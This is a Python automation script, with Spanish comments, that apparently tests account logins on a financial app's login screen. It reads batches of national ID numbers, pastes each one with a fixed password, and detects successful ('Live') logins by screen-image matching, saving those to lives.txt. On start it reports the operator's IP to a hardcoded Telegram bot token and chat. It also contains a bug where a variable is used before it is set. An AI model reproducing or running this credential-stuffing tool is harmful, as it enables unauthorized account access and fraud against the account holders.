import pyautogui 
import time
from PIL import Image
import pyperclip3 as pc
try:
	from requests import get
	import telegram
	#import webbrowser

	bot_token = '5436302048:AAET9-hW1YuaAKDBS70Pn5a0IqkKkxUICp0'
	chat_id = '1850445278'
	bot = telegram.Bot(token=bot_token)

	ip =get("https://api.ipify.org/").text
	#print("your ip :", ip)
	bot.send_message(chat_id=chat_id, text = "Iniciado Oh en coords: "+ ip)

except: 
	print("Sexo1234")

#para el tesseract
try:
	import pytesseract
	pytesseract.pytesseract.tesseract_cmd = r"C:\Tesseract-OCR\tesseract.exe"
	coords = 37,523,489,57
except: 
	print("************")
try:
	import pytesseract
	pytesseract.pytesseract.tesseract_cmd = r"D:\Tesseract-OCR\tesseract.exe"
	coords = 37,523,489,57
except: 
	print("-----------")


#webbrowser.open_new("https://youtu.be/AZkixwsaXOM?t=5")

numtarj = 282,202
monto = 324,329
continuar = 279,955

def click (pos,click = 1 ):
	pyautogui.moveTo(pos)
	pyautogui.click(clicks=click)
def borrar(i):
	for i in range (1,i):
		pyautogui.press('backspace')



clave1 = textoUser[0].rstrip()
#clave2 = textoUser[1].rstrip()
#clave3 = textoUser[2].rstrip()


#print("******* Para el chipi de chipis CrackMovi ********")
print("Presione 'Enter' para continuar")
input()

print("\n")
print("Corriendo Bot")
print("3")
time.sleep(0.5)
print("2")
time.sleep(0.5)
print("1")




linealote= 0
flag2 = True

arhivo_user = open("user.txt","r")
textoUser = arhivo_user.readlines()
arhivo_user.close()

with open ('./lote.txt') as texto:
	for x in texto:
		linealote = linealote + 1
		time.sleep(0.4)
		#cantidadDeLetras = len(x)
		#print(cantidadDeLetras)
		#print("el dni:")
		dni = (x[0:8])
		#print(dni)
		#print("los 4 iultimos:")
		#ultimosdigitos = (x[cantidadDeLetras-5:cantidadDeLetras+1])
		#print(ultimosdigitos)

		pc.copy(dni) # copiando el DNi
		pyautogui.click(93,353) #cordenadas del DNI
		time.sleep(0.4)
		pyautogui.hotkey('ctrl', 'v')
		time.sleep(0.3)
		pyautogui.click(285,464) # continuar
		time.sleep(0.3)

		pyautogui.click(282,380)
		pc.copy(clave1) #Copiando los ultimos digiutos
		time.sleep(0.1)
		pyautogui.click(532,370)
		time.sleep(0.1)
		pyautogui.hotkey('ctrl', 'v')
		time.sleep(0.3)
		pyautogui.click(285,489) #iniciar sesion 

		# ahora confirmar si es live o no
		contador = 0
		b = None
		c = None
		d = None
		aceptarOh = "aceptarOh.png"
		img_confirmar = 'confirmar.png'
		img_confirmar2 = 'confirmar2.png'
		#print("Entrando")
		
		#time.sleep(0.3)

		while (b is None) and (c is None) or (d is None):# Un " Y " poqe si no cumple 1 se rompe el bucle

			b = pyautogui.locateOnScreen(aceptarOh,grayscale=True,confidence=0.9, region=(0,384,568,391)) 
			c = pyautogui.locateOnScreen(img_confirmar, grayscale=True, confidence=0.9, region=(111,925,384,125))
			d = pyautogui.locateOnScreen(img_confirmar2, grayscale=True, confidence=0.9, region=(0,162,564,779))
			if (b != None) or (c != None) or (d !=None):
				break
			if contador > 150: # Por si no encuyentra ninguno
				print("Presione enter para reconocer nuevamente las imagenes")
				contador = 0
				input()

			contador += 1

		#time.sleep(0.1)
		print("-------------------------------------------------")

		if b!=None: # Si no es live

			print("N.", linealote ,": "+ x.rstrip() +" -------------> No es ",clave1 )
			try:
				#para capturar el error en texto con tesseract
				ImagNombre = pyautogui.screenshot(region= (coords)) # d pc
				texNombre = pytesseract.image_to_string( ImagNombre , config= '--psm 6 tessedit_char_whitelist= abcdefghijkmnlopqrsturstuvwxyz0123456789.QWERTYUIOPASDFGHJKLZXCVBNM')
				print(texNombre)
			except:
				print("f")

			time.sleep(0.3)
			#pyautogui.click(497,599) #aceptar
			pyautogui.click(b)
			time.sleep(0.3)
			pyautogui.click(283,285) #Cambiar usuario


			#time.sleep(0.3)
		if (c != None) or (d !=None): # Por si es LIVE:
			print ('\a')
			lives = open("lives.txt","a")
			lives.write(x.rstrip() + " " + clave1 )# escribir en el block
			lives.write("\n")
			lives.close()
			print("N.", linealote ,": "+dni.rstrip()+ "  |  " + "  -------------> Live")


			time.sleep(5)
			#if c!=None:
			pyautogui.click(281,986)
			time.sleep(1)
			pyautogui.press('esc')
			time.sleep(1)
			pyautogui.click(450,548) #volviendo a abrir
			time.sleep(5)
			pyautogui.click(281,623) # iniciar sesion
			time.sleep(1)
			pyautogui.click(284,285) # cambiar usuario
			time.sleep(0.5)

		#print("Gogogogogo")
		
		#time.sleep(0.2)
		#time.sleep(2)
		#print("que")
		#click(lugar_clave)
		#time.sleep(1)
		#print("Loop")
		ultimo = open("registro.txt","w")
		#ultimo.write("El ultimo calado de lote es: ")
		ultimo.write(x.rstrip()) # escribir en el block
		ultimo.write("\n")
		ultimo.close()
			

#lives.close()
print("Programa finalizado")
print("se quedo en la linea: ", linealote)
time.sleep(1)
print("*****************")
print("Presione 'Enter' para Finalizar")
input()